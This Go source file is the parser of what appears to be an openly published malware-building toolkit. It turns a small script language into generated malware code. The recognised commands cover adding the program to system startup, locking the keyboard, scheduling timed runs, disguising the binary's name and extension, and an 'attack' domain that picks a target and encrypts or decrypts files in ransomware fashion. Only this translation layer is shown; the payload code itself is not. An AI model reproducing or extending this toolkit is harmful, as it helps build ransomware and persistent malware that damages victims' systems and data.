package parser

import (
	"regexp"
	"strings"

	mal "github.com/s9rA16Bf4/go-evil/domains/malware"
	"github.com/s9rA16Bf4/go-evil/utility/io"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

const EXTRACT_MAIN_FUNC = "((main ?: ?{{1,1}(?s).*}))"                           // Grabs the main function
const EXTRACT_MAIN_FUNC_HEADER = "(main:{)"                                      // We use this to identify if there are multiple main functions in the same file
const EXTRACT_FUNCTION_CALL = "([#a-z]+)\\.([a-z0-9_]+)\\((\"(.+)\")?\\);"       // Grabs function and a potential value
const EXTRACT_FUNCTION_CALL_WRONG = "([#a-z]+)\\.([a-z_]+)\\((\"(.*)\")?\\)[^;]" // And this is utilized to find rows that don't end in ;

func Interpeter(file_to_read string) {
	content := io.Read_file(file_to_read)

	regex := regexp.MustCompile(EXTRACT_MAIN_FUNC)
	main_function := regex.FindAllStringSubmatch(content, -1)

	if len(main_function) == 0 { // No main function was found
		notify.Error("Failed to find a main function in the provided file "+file_to_read, "parser.interpeter()")
	}

	regex = regexp.MustCompile(EXTRACT_MAIN_FUNC_HEADER)
	main_header := regex.FindAllStringSubmatch(content, -1)
	if len(main_header) > 1 { // Multiple main functions were defined
		notify.Error("Found multiple main definitions in the provided file "+file_to_read, "parser.interpeter()")
	}
	regex = regexp.MustCompile(EXTRACT_FUNCTION_CALL_WRONG)
	match := regex.FindAllStringSubmatch(content, -1)
	if len(match) > 0 {
		line := match[0][0]
		line = strings.ReplaceAll(line, "\n", "")
		notify.Error("The line '"+line+"' in the file "+file_to_read+" is missing a semi-colon", "parser.interpeter()")
	}

	regex = regexp.MustCompile(EXTRACT_FUNCTION_CALL)
	match = regex.FindAllStringSubmatch(content, -1)
	for _, funct := range match {
		notify.Log("Found possible domain "+funct[1], notify.Verbose_lvl, "3")
		switch funct[1] {

		case "window": // The window domain was called
			io.Append_domain("window")
			notify.Log("Found possible function "+funct[2], notify.Verbose_lvl, "3")
			switch funct[2] { // Checks the function that were called from the domain
			case "x":
				mal.Malware_addContent("win.Window_setX(\"" + funct[4] + "\")")
			case "y":
				mal.Malware_addContent("win.Window_setY(\"" + funct[4] + "\")")

			case "title":
				mal.Malware_addContent("win.Window_setTitle(\"" + funct[4] + "\")")

			case "goto":
				mal.Malware_addContent("win.Window_goToUrl(\"" + funct[4] + "\")")

			case "display":
				mal.Malware_addContent("win.Window_display(\"" + funct[4] + "\")")

			default:
				notify.Error("Unknown function '"+funct[2]+"' in domain '"+funct[1]+"'", "parser.interpreter()")
			}

		case "system": // The system domain was called
			io.Append_domain("system")
			notify.Log("Found possible function "+funct[2], notify.Verbose_lvl, "3")

			switch funct[2] { // Function within this domain
			case "exit":
				mal.Malware_addContent("sys.System_exit(\"" + funct[4] + "\")")

			case "out":
				mal.Malware_addContent("sys.System_out(\"" + funct[4] + "\")")
			case "add_to_startup":
				mal.Malware_addContent("sys.System_add_to_startup()")

			default:
				notify.Error("Unknown function '"+funct[2]+"' in domain '"+funct[1]+"'", "parser.interpreter()")
			}

		case "malware", "#object", "#self", "#this": // We are gonna modify the binary in some way
			notify.Log("Found possible function "+funct[2], notify.Verbose_lvl, "3")

			switch funct[2] {
			case "name":
				mal.Malware_setBinaryName(funct[4])
			case "extension":
				mal.Malware_setExtension(funct[4])

			default:
				notify.Error("Unknown function '"+funct[2]+"' in domain '"+funct[1]+"'", "parser.interpreter()")
			}

		case "time", "#wait": // Somebody wants to utilize our wait functionallity
			io.Append_domain("time")
			notify.Log("Found possible function "+funct[2], notify.Verbose_lvl, "3")

			switch funct[2] {
			case "run":
				mal.Malware_addContent("time.Time_run()")
			case "year":
				mal.Malware_addContent("time.Time_setYear(\"" + funct[4] + "\")")
			case "month":
				mal.Malware_addContent("time.Time_setMonth(\"" + funct[4] + "\")")
			case "day":
				mal.Malware_addContent("time.Time_setDay(\"" + funct[4] + "\")")
			case "hour":
				mal.Malware_addContent("time.Time_setHour(\"" + funct[4] + "\")")
			case "min":
				mal.Malware_addContent("time.Time_setMin(\"" + funct[4] + "\")")
			case "until":
				mal.Malware_addContent("time.Time_until(\"" + funct[4] + "\")")

			default:
				notify.Error("Unknown function '"+funct[2]+"' in domain '"+funct[1]+"'", "parser.interpreter()")
			}
		case "keyboard":
			io.Append_domain("keyboard")
			notify.Log("Found possible function "+funct[2], notify.Verbose_lvl, "3")

			switch funct[2] {
			case "lock":
				mal.Malware_addContent("keyboard.Keyboard_lock()")
			case "unlock":
				mal.Malware_addContent("keyboard.Keyboard_unlock()")

			default:
				notify.Error("Unknown function '"+funct[2]+"' in domain '"+funct[1]+"'", "parser.interpreter()")
			}
		case "attack":
			io.Append_domain("attack_vector")
			notify.Log("Found possible function "+funct[2], notify.Verbose_lvl, "3")

			switch funct[2] {
			case "set_target":
				mal.Malware_addContent("attack.Encrypt_set_target(\"" + funct[4] + "\")")
			case "set_encryption":
				mal.Malware_addContent("attack.Encrypt_set_encryption_method(\"" + funct[4] + "\")")
			case "encrypt":
				mal.Malware_addContent("attack.Encrypt_encrypt()")
			case "decrypt":
				mal.Malware_addContent("attack.Encrypt_decrypt()")

			default:
				notify.Error("Unknown function '"+funct[2]+"' in domain '"+funct[1]+"'", "parser.interpreter()")
			}

		default:
			notify.Error("Unknown domain '"+funct[1]+"'", "parser.interpeter()")
		}
	}
}
